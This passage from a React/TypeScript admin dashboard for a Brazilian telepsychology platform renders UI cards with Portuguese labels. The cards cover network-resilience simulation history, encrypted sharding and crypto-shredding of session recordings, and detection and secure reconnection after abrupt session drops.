                    {resilienceHistory.map((report) => (
                      <tr
                        key={report.id}
                        onClick={() => setLatestSimulationReport(report)}
                        className="hover:bg-slate-50 dark:hover:bg-slate-800/40 cursor-pointer transition-colors"
                      >
                        <td className="py-2 px-3.5 font-mono text-[11px] text-slate-600 dark:text-slate-400 whitespace-nowrap">
                          {new Date(report.timestamp).toLocaleString('pt-BR')}
                        </td>
                        <td className="py-2 px-3.5 font-medium text-slate-800 dark:text-slate-200">
                          {report.profile}
                        </td>
                        <td className="py-2 px-3.5 font-mono text-[11px] text-slate-600 dark:text-slate-400">
                          {report.params.packetLossPercent}% / {report.params.jitterMs}ms
                        </td>
                        <td className="py-2 px-3.5 font-mono font-bold text-teal-600 dark:text-teal-400">
                          {report.assessment.mosScore.toFixed(2)}
                        </td>
                        <td className="py-2 px-3.5">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-extrabold ${
                            report.assessment.intelligibilityGrade === ClinicalIntelligibilityGrade.EXCELLENT
                              ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/80 dark:text-emerald-300'
                              : report.assessment.intelligibilityGrade === ClinicalIntelligibilityGrade.GOOD
                              ? 'bg-blue-100 text-blue-800 dark:bg-blue-950/80 dark:text-blue-300'
                              : report.assessment.intelligibilityGrade === ClinicalIntelligibilityGrade.DEGRADED
                              ? 'bg-amber-100 text-amber-800 dark:bg-amber-950/80 dark:text-amber-300'
                              : 'bg-rose-100 text-rose-800 dark:bg-rose-950/80 dark:text-rose-300'
                          }`}>
                            {report.assessment.intelligibilityGrade}
                          </span>
                        </td>
                        <td className="py-2 px-3.5">
                          {report.assessment.requiresContingency ? (
                            <span className="px-2 py-0.5 rounded text-[10px] font-extrabold bg-rose-200 text-rose-900 dark:bg-rose-900 dark:text-rose-200">
                              SIM (MIGRAR)
                            </span>
                          ) : (
                            <span className="px-2 py-0.5 rounded text-[10px] font-extrabold bg-emerald-100 text-emerald-800 dark:bg-emerald-950/80 dark:text-emerald-300">
                              DISPENSADA
                            </span>
                          )}
                        </td>
                        <td className="py-2 px-3.5 font-mono text-[10px] text-teal-600 dark:text-teal-400" title={report.probatoryDigest}>
                          {report.probatoryDigest.slice(0, 10)}...
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Card 15: Sharding de Mídia & Destruição Programada (Crypto-Shredding) (RFC-001 §3.2, §3.3, §4.2 e CFP 011/2018) */}
      {(currentUser.role === UserRole.ADMIN || currentUser.role === UserRole.PSICOLOGO_TITULAR) && (
        <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
          {/* Header */}
          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 pb-6 border-b border-slate-100 dark:border-slate-800">
            <div className="flex items-center gap-3">
              <div className="p-3 bg-indigo-50 dark:bg-indigo-950/50 rounded-2xl border border-indigo-200/50 dark:border-indigo-800/50 text-indigo-600 dark:text-indigo-400">
                <Scissors className="w-6 h-6" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <h2 className="text-lg font-bold text-slate-900 dark:text-white">
                    15. Sharding de Mídia & Destruição Programada (Crypto-Shredding)
                  </h2>
                  <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-indigo-100 text-indigo-800 dark:bg-indigo-950/80 dark:text-indigo-300 border border-indigo-300 dark:border-indigo-700">
                    RFC-001 §3.2 / LGPD Art. 16
                  </span>
                </div>
                <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                  Particionamento criptográfico de teleconsultas com DEKs efêmeras em repouso, validação de integridade Merkle e expurgamento irreversível pós-transcrição.
                </p>
              </div>
            </div>

            <button
              onClick={fetchMediaStorageData}
              disabled={loadingMediaStorage}
              className="inline-flex items-center gap-2 px-3 py-1.5 rounded-xl text-xs font-semibold bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 transition-colors cursor-pointer self-start sm:self-center"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${loadingMediaStorage ? 'animate-spin' : ''}`} />
              Atualizar Storage
            </button>
          </div>

          {/* 4 KPIs de Storage e Shredding */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
            <div className="bg-slate-50 dark:bg-slate-800/40 p-4 rounded-2xl border border-slate-100 dark:border-slate-800">
              <span className="text-[11px] font-semibold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1">
                Gravações Particionadas
              </span>
              <div className="flex items-baseline gap-2">
                <span className="text-2xl font-bold text-indigo-600 dark:text-indigo-400">
                  {mediaStorageMetrics?.totalRecordings ?? 0}
                </span>
                <span className="text-[11px] text-slate-400 font-mono">sessões</span>
              </div>
              <span className="text-[10px] text-slate-400 dark:text-slate-500 mt-1 block">
                Shards com DEKs efêmeras
              </span>
            </div>

            <div className="bg-slate-50 dark:bg-slate-800/40 p-4 rounded-2xl border border-slate-100 dark:border-slate-800">
              <span className="text-[11px] font-semibold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1">
                Shards em Repouso
              </span>
              <div className="flex items-baseline gap-2">
                <span className="text-2xl font-bold text-slate-900 dark:text-white">
                  {mediaStorageMetrics?.activeShardsInStorage ?? 0}
                </span>
                <span className="text-[10px] text-teal-600 dark:text-teal-400 font-medium">AES-256-GCM</span>
              </div>
              <span className="text-[10px] text-slate-400 dark:text-slate-500 mt-1 block">
                Cifrados antes do expurgo
              </span>
            </div>

            <div className="bg-slate-50 dark:bg-slate-800/40 p-4 rounded-2xl border border-slate-100 dark:border-slate-800">
              <span className="text-[11px] font-semibold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1">
                Sessões Expurgadas 100%
              </span>
              <div className="flex items-baseline gap-2">
                <span className="text-2xl font-bold text-emerald-600 dark:text-emerald-400">
                  {mediaStorageMetrics?.shreddedRecordingsCount ?? 0}
                </span>
                <span className="text-[10px] text-emerald-600 font-bold">CFP 011/2018</span>
              </div>
              <span className="text-[10px] text-slate-400 dark:text-slate-500 mt-1 block">
                Áudio bruto destruído
              </span>
            </div>

            <div className="bg-slate-50 dark:bg-slate-800/40 p-4 rounded-2xl border border-slate-100 dark:border-slate-800">
              <span className="text-[11px] font-semibold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1">
                Bytes Destruídos (Zero-Fill)
              </span>
              <div className="flex items-baseline gap-2">
                <span className="text-2xl font-bold text-rose-600 dark:text-rose-400">
                  {mediaStorageMetrics?.totalBytesPurged ?? 0}
                </span>
                <span className="text-[11px] text-slate-400 font-mono">bytes</span>
              </div>
              <span className="text-[10px] text-slate-400 dark:text-slate-500 mt-1 block">
                {mediaStorageMetrics?.shreddedShardsCount ?? 0} shards purgados
              </span>
            </div>
          </div>

          {/* Simulador de Particionamento & Ingestão */}
          <form onSubmit={handleSimulateMediaRecording} className="bg-slate-50/70 dark:bg-slate-800/30 p-5 rounded-2xl border border-slate-200/80 dark:border-slate-800 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-bold uppercase tracking-wider text-slate-700 dark:text-slate-300 flex items-center gap-2">
                <HardDrive className="w-4 h-4 text-indigo-600 dark:text-indigo-400" />
                Simulador de Gravação com Sharding Criptográfico
              </h3>
              <span className="text-[11px] font-mono text-slate-500 dark:text-slate-400">
                Envelope Encryption por Shard
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
              <div>
                <label className="text-[11px] font-semibold text-slate-600 dark:text-slate-400 block mb-1">
                  ID da Sessão Clínica:
                </label>
                <input
                  type="text"
                  value={newMediaSessionId}
                  onChange={(e) => setNewMediaSessionId(e.target.value)}
                  placeholder="sess-telepsico-123"
                  className="w-full text-xs font-mono bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded-xl px-3 py-2 text-slate-900 dark:text-white focus:outline-none focus:ring-1 focus:ring-indigo-500"
                />
              </div>

              <div>
                <label className="text-[11px] font-semibold text-slate-600 dark:text-slate-400 block mb-1">
                  Quantidade de Shards (Chunks):
                </label>
                <select
                  value={newMediaShardsCount}
                  onChange={(e) => setNewMediaShardsCount(parseInt(e.target.value, 10))}
                  className="w-full text-xs bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded-xl px-3 py-2 text-slate-900 dark:text-white focus:outline-none focus:ring-1 focus:ring-indigo-500"
                >
                  <option value={2}>2 Shards (Consulta Rápida ~15min)</option>
                  <option value={4}>4 Shards (Sessão Padrão ~50min)</option>
                  <option value={6}>6 Shards (Avaliação Estendida ~90min)</option>
                  <option value={8}>8 Shards (Sessão de Alta Densidade)</option>
                </select>
              </div>

              <div>
                <label className="text-[11px] font-semibold text-slate-600 dark:text-slate-400 block mb-1">
                  Codec de Codificação:
                </label>
                <select
                  value={newMediaCodec}
                  onChange={(e) => setNewMediaCodec(e.target.value as AudioCodecType)}
                  className="w-full text-xs bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded-xl px-3 py-2 text-slate-900 dark:text-white focus:outline-none focus:ring-1 focus:ring-indigo-500"
                >
                  <option value={AudioCodecType.OPUS_FULLBAND}>Opus Fullband 48kHz (Padrão Ouro)</option>
                  <option value={AudioCodecType.OPUS_VOIP}>Opus VoIP 16kHz</option>
                  <option value={AudioCodecType.G722}>G.722 Wideband</option>
                </select>
              </div>
            </div>

            <div className="flex justify-end pt-2 border-t border-slate-200/50 dark:border-slate-800/80">
              <button
                type="submit"
                disabled={simulatingMediaSharding}
                className="inline-flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold text-white bg-indigo-600 hover:bg-indigo-700 active:bg-indigo-800 disabled:opacity-50 transition-all cursor-pointer shadow-sm shadow-indigo-500/20"
              >
                <Play className={`w-3.5 h-3.5 ${simulatingMediaSharding ? 'animate-spin' : ''}`} />
                {simulatingMediaSharding ? 'Processando Shards...' : 'Gerar Gravação Particionada & Selar Merkle Root'}
              </button>
            </div>
          </form>

          {/* Detalhes da Gravação Ativa e Visualizador de Shards */}
          {selectedRecording && (
            <div className="p-5 rounded-2xl border border-slate-200 dark:border-slate-800 bg-slate-50/40 dark:bg-slate-800/20 space-y-4">
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-4 border-b border-slate-200/60 dark:border-slate-800/80">
                <div>
                  <div className="flex items-center gap-2">
                    <span className="text-xs font-bold text-slate-900 dark:text-white uppercase tracking-wider">
                      Gravação Selecionada:
                    </span>
                    <span className="font-mono text-xs font-bold text-indigo-600 dark:text-indigo-400">
                      {selectedRecording.id}
                    </span>
                    <span className={`px-2 py-0.5 rounded text-[10px] font-extrabold uppercase ${
                      selectedRecording.status === MediaRecordingStatus.SHREDDED_PURGED
                        ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/80 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-800'
                        : selectedRecording.status === MediaRecordingStatus.SHARDED_ENCRYPTED
                        ? 'bg-blue-100 text-blue-800 dark:bg-blue-950/80 dark:text-blue-300 border border-blue-300 dark:border-blue-800'
                        : 'bg-amber-100 text-amber-800 dark:bg-amber-950/80 dark:text-amber-300 border border-amber-300 dark:border-amber-800'
                    }`}>
                      {selectedRecording.status}
                    </span>
                  </div>
                  <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                    Sessão: <strong className="font-mono text-slate-700 dark:text-slate-300">{selectedRecording.sessionId}</strong> | Codec: {selectedRecording.codec} | {selectedRecording.totalBytes} bytes em {selectedRecording.totalShards} shards
                  </p>
                </div>

                <div className="flex flex-wrap items-center gap-2">
                  {selectedRecording.status !== MediaRecordingStatus.SHREDDED_PURGED && (
                    <>
                      <button
                        onClick={() => handleSimulatePipeline(selectedRecording.id, true)}
                        disabled={shreddingMediaId === selectedRecording.id}
                        className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-bold bg-teal-600 hover:bg-teal-700 text-white shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                      >
                        <Zap className="w-3.5 h-3.5" />
                        Transcrever & Auto-Expurgar
                      </button>

                      <button
                        onClick={() => handleExecuteCryptoShredding(selectedRecording.id)}
                        disabled={shreddingMediaId === selectedRecording.id}
                        className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-bold bg-rose-600 hover:bg-rose-700 text-white shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                        Crypto-Shredding Imediato
                      </button>
                    </>
                  )}

                  {selectedRecording.status === MediaRecordingStatus.SHREDDED_PURGED && (
                    <button
                      onClick={() => handleViewCertificate(selectedRecording.id)}
                      className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-bold bg-emerald-600 hover:bg-emerald-700 text-white shadow-sm transition-colors cursor-pointer"
                    >
                      <ShieldCheck className="w-3.5 h-3.5" />
                      Certificado de Destruição
                    </button>
                  )}
                </div>
              </div>

              {/* Merkle Root da Gravação */}
              <div className="flex flex-wrap items-center justify-between gap-2 text-[11px] font-mono bg-slate-100 dark:bg-slate-800/80 p-3 rounded-xl border border-slate-200/60 dark:border-slate-700/60">
                <span className="flex items-center gap-1.5 text-slate-700 dark:text-slate-300">
                  <Layers className="w-4 h-4 text-indigo-500" />
                  Merkle Tree Root: <strong className="text-indigo-600 dark:text-indigo-400">{selectedRecording.merkleRoot || 'Pendente'}</strong>
                </span>
                <span className="text-slate-400 text-[10px]">
                  {selectedRecording.wormAuditId ? `WORM ID: ${selectedRecording.wormAuditId.slice(0, 8)}...` : 'Gravação Ativa'}
                </span>
              </div>

              {/* Grid Visual de Shards */}
              <div className="space-y-2">
                <span className="text-[11px] font-bold text-slate-700 dark:text-slate-300 uppercase tracking-wider block">
                  Topologia dos Shards Criptografados ({selectedRecording.shards.length} blocos):
                </span>
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5">
                  {selectedRecording.shards.map((shard) => {
                    const isDestroyed = shard.status === MediaShardStatus.SHREDDED_DESTROYED;
                    return (
                      <div
                        key={shard.shardId}
                        className={`p-3 rounded-xl border text-xs transition-all ${
                          isDestroyed
                            ? 'bg-slate-100/60 dark:bg-slate-900/40 border-slate-200 dark:border-slate-800/80 opacity-70'
                            : 'bg-white dark:bg-slate-900 border-indigo-200 dark:border-indigo-900/60 shadow-xs'
                        }`}
                      >
                        <div className="flex items-center justify-between pb-1.5 border-b border-slate-100 dark:border-slate-800">
                          <span className="font-bold text-slate-800 dark:text-slate-200">
                            Shard #{shard.shardIndex}
                          </span>
                          <span className={`px-1.5 py-0.5 rounded text-[9px] font-extrabold ${
                            isDestroyed
                              ? 'bg-rose-100 text-rose-800 dark:bg-rose-950 dark:text-rose-300'
                              : 'bg-indigo-100 text-indigo-800 dark:bg-indigo-950 dark:text-indigo-300'
                          }`}>
                            {isDestroyed ? 'EXPURGADO' : 'CIFRADO'}
                          </span>
                        </div>

                        <div className="mt-2 space-y-1 font-mono text-[10px] text-slate-500 dark:text-slate-400">
                          <div className="flex justify-between">
                            <span>Tamanho:</span>
                            <span className="text-slate-700 dark:text-slate-300 font-bold">{shard.byteLength} B</span>
                          </div>
                          <div className="flex justify-between">
                            <span>DEK:</span>
                            <span className={isDestroyed ? 'text-rose-500 font-bold' : 'text-teal-600'}>
                              {isDestroyed ? 'PURGED (0x0)' : 'Envelope KMS'}
                            </span>
                          </div>
                          <div className="truncate" title={shard.sha256Hash}>
                            Hash: {shard.sha256Hash.slice(0, 10)}...
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>
          )}

          {/* Tabela de Gravações Recentes */}
          <div className="space-y-3">
            <h4 className="text-xs font-bold text-slate-700 dark:text-slate-300 uppercase tracking-wider">
              Histórico de Gravações & Protocolos de Expurgamento ({mediaRecordings.length} sessões)
            </h4>

            {mediaRecordings.length === 0 ? (
              <div className="p-6 text-center text-xs text-slate-400 border border-dashed border-slate-200 dark:border-slate-800 rounded-2xl">
                Nenhuma gravação particionada no momento. Utilize o simulador acima para iniciar.
              </div>
            ) : (
              <div className="overflow-x-auto border border-slate-200 dark:border-slate-800 rounded-2xl">
                <table className="w-full text-left text-xs">
                  <thead className="bg-slate-50 dark:bg-slate-800/60 border-b border-slate-200 dark:border-slate-800 text-[11px] font-semibold text-slate-500 dark:text-slate-400">
                    <tr>
                      <th className="py-2.5 px-3.5">Data/Hora</th>
                      <th className="py-2.5 px-3.5">Sessão</th>
                      <th className="py-2.5 px-3.5">Shards / Bytes</th>
                      <th className="py-2.5 px-3.5">Status</th>
                      <th className="py-2.5 px-3.5">Merkle Root</th>
                      <th className="py-2.5 px-3.5 text-right">Ação</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-slate-800/80">
                    {mediaRecordings.map((rec) => (
                      <tr
                        key={rec.id}
                        onClick={() => setSelectedRecording(rec)}
                        className="hover:bg-slate-50 dark:hover:bg-slate-800/40 cursor-pointer transition-colors"
                      >
                        <td className="py-2 px-3.5 font-mono text-[11px] text-slate-600 dark:text-slate-400 whitespace-nowrap">
                          {new Date(rec.createdAt).toLocaleString('pt-BR')}
                        </td>
                        <td className="py-2 px-3.5 font-medium text-slate-800 dark:text-slate-200">
                          {rec.sessionId}
                        </td>
                        <td className="py-2 px-3.5 font-mono text-[11px] text-slate-600 dark:text-slate-400">
                          {rec.totalShards} shards ({rec.totalBytes} B)
                        </td>
                        <td className="py-2 px-3.5">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-extrabold ${
                            rec.status === MediaRecordingStatus.SHREDDED_PURGED
                              ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/80 dark:text-emerald-300'
                              : rec.status === MediaRecordingStatus.SHARDED_ENCRYPTED
                              ? 'bg-blue-100 text-blue-800 dark:bg-blue-950/80 dark:text-blue-300'
                              : 'bg-amber-100 text-amber-800 dark:bg-amber-950/80 dark:text-amber-300'
                          }`}>
                            {rec.status}
                          </span>
                        </td>
                        <td className="py-2 px-3.5 font-mono text-[10px] text-indigo-600 dark:text-indigo-400" title={rec.merkleRoot}>
                          {rec.merkleRoot ? `${rec.merkleRoot.slice(0, 10)}...` : 'Em andamento'}
                        </td>
                        <td className="py-2 px-3.5 text-right">
                          {rec.status === MediaRecordingStatus.SHREDDED_PURGED ? (
                            <button
                              type="button"
                              onClick={(e) => {
                                e.stopPropagation();
                                handleViewCertificate(rec.id);
                              }}
                              className="px-2 py-1 rounded-lg text-[10px] font-bold bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 cursor-pointer"
                            >
                              Ver Laudo
                            </button>
                          ) : (
                            <button
                              type="button"
                              onClick={(e) => {
                                e.stopPropagation();
                                handleExecuteCryptoShredding(rec.id);
                              }}
                              className="px-2 py-1 rounded-lg text-[10px] font-bold bg-rose-100 hover:bg-rose-200 dark:bg-rose-950 dark:hover:bg-rose-900 text-rose-700 dark:text-rose-300 cursor-pointer"
                            >
                              Expurgar
                            </button>
                          )}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Card 16: Detector de Desconexão Abrupta & Protocolo de Reconexão Segura (RFC-001 §3.2 & CFP nº 011/2018) */}
      {(currentUser.role === UserRole.ADMIN || currentUser.role === UserRole.PSICOLOGO_TITULAR) && (
        <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 border border-slate-200/80 dark:border-slate-800 shadow-sm transition-all space-y-6">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800/80">
            <div className="flex items-center gap-3">
              <div className="p-2.5 rounded-2xl bg-cyan-50 dark:bg-cyan-950/40 text-cyan-600 dark:text-cyan-400 border border-cyan-200/60 dark:border-cyan-800/60 shadow-xs">
                <Radio className="w-5 h-5 animate-pulse" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <h3 className="text-base font-bold text-slate-900 dark:text-white">
                    Detector de Desconexão Abrupta & Protocolo de Reconexão Segura
                  </h3>
                  <span className="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-cyan-100 text-cyan-800 dark:bg-cyan-950 dark:text-cyan-300">
                    RFC-001 §3.2
                  </span>
                  <span className="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-blue-100 text-blue-800 dark:bg-blue-950 dark:text-blue-300">
                    CFP nº 011/2018
                  </span>
                </div>
                <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                  Mitigação de quedas de rede e contingência ética: snapshot volátil incremental cifrado com AES-256-GCM, tokens de reconexão HMAC-SHA256 e janela de tolerância de 10 min.
                </p>
              </div>
            </div>

            <button
              type="button"
              onClick={fetchSessionRecoveryData}
              disabled={loadingRecovery}
              className="px-3 py-1.5 rounded-xl border border-slate-200 dark:border-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-50 dark:hover:bg-slate-800/60 text-xs font-semibold flex items-center gap-1.5 transition-colors cursor-pointer self-start sm:self-auto disabled:opacity-50"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${loadingRecovery ? 'animate-spin' : ''}`} />
              Atualizar
            </button>
          </div>

          {/* 4 KPIs em Tempo Real */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
            <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200/60 dark:border-slate-700/60">
              <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider block">
                Sessões Monitoradas
              </span>
              <div className="mt-1 text-2xl font-black text-slate-900 dark:text-white flex items-baseline gap-1.5">
                {recoveryMetrics?.totalMonitoredSessions ?? recoverySessions.length}
                <span className="text-xs font-normal text-slate-400">total</span>
              </div>
            </div>

            <div className="p-4 rounded-2xl bg-emerald-50/50 dark:bg-emerald-950/20 border border-emerald-200/60 dark:border-emerald-900/60">
              <span className="text-[11px] font-bold text-emerald-800 dark:text-emerald-400 uppercase tracking-wider block">
                Sessões Online (Ativas)
              </span>
              <div className="mt-1 text-2xl font-black text-emerald-600 dark:text-emerald-400 flex items-baseline gap-1.5">
                {recoveryMetrics?.activeConnectedCount ?? 0}
                <span className="text-xs font-normal text-emerald-700/70 dark:text-emerald-500">heartbeat ativo</span>
              </div>
            </div>

            <div className="p-4 rounded-2xl bg-amber-50/50 dark:bg-amber-950/20 border border-amber-200/60 dark:border-amber-900/60">
              <span className="text-[11px] font-bold text-amber-800 dark:text-amber-400 uppercase tracking-wider block">
                Em Tolerância (Queda)
              </span>
              <div className="mt-1 text-2xl font-black text-amber-600 dark:text-amber-400 flex items-baseline gap-1.5">
                {recoveryMetrics?.pendingReconnectCount ?? 0}
                <span className="text-xs font-normal text-amber-700/70 dark:text-amber-500">janela 10 min</span>
              </div>
            </div>

            <div className="p-4 rounded-2xl bg-cyan-50/50 dark:bg-cyan-950/20 border border-cyan-200/60 dark:border-cyan-900/60">
              <span className="text-[11px] font-bold text-cyan-800 dark:text-cyan-400 uppercase tracking-wider block">
                Taxa de Recuperação
              </span>
              <div className="mt-1 text-2xl font-black text-cyan-600 dark:text-cyan-400 flex items-baseline gap-1.5">
                {recoveryMetrics?.recoverySuccessRate ?? 100}%
                <span className="text-xs font-normal text-cyan-700/70 dark:text-cyan-500">
                  {recoveryMetrics?.avgReconnectionTimeSeconds ? `~${recoveryMetrics.avgReconnectionTimeSeconds}s` : 'sem perdas'}
                </span>
              </div>
            </div>
          </div>

          {/* Painel Interativo de Simulação de Teleatendimento */}
          <div className="p-5 rounded-2xl bg-slate-50/80 dark:bg-slate-800/40 border border-slate-200/80 dark:border-slate-800 space-y-4">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
              <div className="flex items-center gap-2">
                <Activity className="w-4 h-4 text-cyan-600 dark:text-cyan-400" />
                <h4 className="text-sm font-bold text-slate-800 dark:text-slate-200">
                  Simulador de Teleconsulta & Teste de Queda de Rede
                </h4>
              </div>
              <span className="text-[11px] text-slate-400 font-mono">
                Preservação de Dados Clínicos com Zero Loss
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div>
                <label className="text-[11px] font-bold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1">
                  ID da Sessão Clínica:
                </label>
                <input
                  type="text"
                  value={recoverySessionIdInput}
                  onChange={(e) => setRecoverySessionIdInput(e.target.value)}
                  placeholder="Ex: sess-telepsico-demo"
                  disabled={activeRecoverySession !== null && activeRecoverySession.state === ClinicalSessionState.ACTIVE_CONNECTED}
                  className="w-full px-3 py-2 rounded-xl text-xs font-mono bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 text-slate-800 dark:text-slate-200 focus:outline-none focus:ring-2 focus:ring-cyan-500"
                />
              </div>

              <div className="sm:col-span-2">
                <label className="text-[11px] font-bold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1">
                  Anotações Clínicas em Tempo Real (Snapshot Volátil):
                </label>
                <input
                  type="text"
                  value={recoveryNotesInput}
                  onChange={(e) => setRecoveryNotesInput(e.target.value)}
                  placeholder="Digite observações clínicas durante a sessão..."
                  className="w-full px-3 py-2 rounded-xl text-xs bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 text-slate-800 dark:text-slate-200 focus:outline-none focus:ring-2 focus:ring-cyan-500"
                />
              </div>
            </div>

            {/* Ações da Sessão */}
            <div className="flex flex-wrap items-center gap-2 pt-2 border-t border-slate-200/60 dark:border-slate-800">
              {!activeRecoverySession || activeRecoverySession.state === ClinicalSessionState.COMPLETED_NORMALLY || activeRecoverySession.state === ClinicalSessionState.TERMINATED_TIMEOUT ? (
                <button
                  type="button"
                  onClick={handleStartRecoverySession}
                  disabled={actionInProgress}
                  className="px-4 py-2 rounded-xl text-xs font-bold bg-cyan-600 hover:bg-cyan-700 text-white shadow-sm transition-colors cursor-pointer flex items-center gap-2 disabled:opacity-50"
                >
                  <Play className="w-3.5 h-3.5" />
                  Iniciar Sessão Clínica Monitorada
                </button>
              ) : (
                <>
                  {activeRecoverySession.state === ClinicalSessionState.ACTIVE_CONNECTED && (
                    <>
                      <button
                        type="button"
                        onClick={handleSendRecoveryHeartbeat}
                        disabled={actionInProgress}
                        className="px-3.5 py-2 rounded-xl text-xs font-bold bg-slate-200 hover:bg-slate-300 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-800 dark:text-slate-200 transition-colors cursor-pointer flex items-center gap-1.5 disabled:opacity-50"
                      >
                        <Activity className="w-3.5 h-3.5 text-rose-500" />
                        Enviar Heartbeat (#{activeRecoverySession.heartbeatCount})
                      </button>

                      <button
                        type="button"
                        onClick={() => handleTriggerDisconnection(DisconnectionCause.SOCKET_DROP)}
                        disabled={actionInProgress}
                        className="px-3.5 py-2 rounded-xl text-xs font-bold bg-rose-600 hover:bg-rose-700 text-white shadow-sm transition-colors cursor-pointer flex items-center gap-1.5 disabled:opacity-50"
                      >
                        <WifiOff className="w-3.5 h-3.5" />
                        Simular Queda Abrupta (Drop Conexão)
                      </button>

                      <button
                        type="button"
                        onClick={handleCompleteSession}
                        disabled={actionInProgress}
                        className="px-3.5 py-2 rounded-xl text-xs font-bold bg-emerald-600 hover:bg-emerald-700 text-white shadow-sm transition-colors cursor-pointer flex items-center gap-1.5 disabled:opacity-50 ml-auto"
                      >
                        <CheckCircle2 className="w-3.5 h-3.5" />
                        Concluir Consulta
                      </button>
                    </>
                  )}

                  {activeRecoverySession.state === ClinicalSessionState.DISCONNECTED_PENDING_RECONNECT && (
                    <>
                      <button
                        type="button"
                        onClick={handleAttemptSessionReconnect}
                        disabled={actionInProgress}
                        className="px-4 py-2 rounded-xl text-xs font-bold bg-emerald-600 hover:bg-emerald-700 text-white shadow-sm transition-colors cursor-pointer flex items-center gap-1.5 disabled:opacity-50 animate-pulse"
                      >
                        <RotateCcw className="w-3.5 h-3.5" />
                        Reconectar Automaticamente com Token HMAC
                      </button>

                      <button
                        type="button"
                        onClick={handleCompleteSession}
                        disabled={actionInProgress}
                        className="px-3.5 py-2 rounded-xl text-xs font-bold bg-slate-200 hover:bg-slate-300 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-800 dark:text-slate-200 transition-colors cursor-pointer ml-auto"
                      >
                        Encerrar por Contingência
                      </button>
                    </>
                  )}

                  {activeRecoverySession.state === ClinicalSessionState.RECONNECTED && (
                    <>
                      <button
                        type="button"
                        onClick={handleSendRecoveryHeartbeat}
                        disabled={actionInProgress}
                        className="px-3.5 py-2 rounded-xl text-xs font-bold bg-cyan-600 hover:bg-cyan-700 text-white shadow-sm transition-colors cursor-pointer flex items-center gap-1.5"
                      >
                        <Play className="w-3.5 h-3.5" />
                        Continuar Consulta Online
                      </button>

                      <button
                        type="button"
                        onClick={handleCompleteSession}
                        disabled={actionInProgress}
                        className="px-3.5 py-2 rounded-xl text-xs font-bold bg-emerald-600 hover:bg-emerald-700 text-white shadow-sm transition-colors cursor-pointer flex items-center gap-1.5 ml-auto"
                      >
                        <CheckCircle2 className="w-3.5 h-3.5" />
                        Concluir Consulta
                      </button>
                    </>
                  )}
                </>
              )}
            </div>

            {/* Painel de Status da Sessão Ativa */}
            {activeRecoverySession && (
              <div className={`p-4 rounded-2xl border text-xs space-y-3 transition-all ${
                activeRecoverySession.state === ClinicalSessionState.ACTIVE_CONNECTED
                  ? 'bg-emerald-50/50 dark:bg-emerald-950/20 border-emerald-200 dark:border-emerald-900/60'
                  : activeRecoverySession.state === ClinicalSessionState.DISCONNECTED_PENDING_RECONNECT
                  ? 'bg-rose-50/70 dark:bg-rose-950/30 border-rose-200 dark:border-rose-900/60'
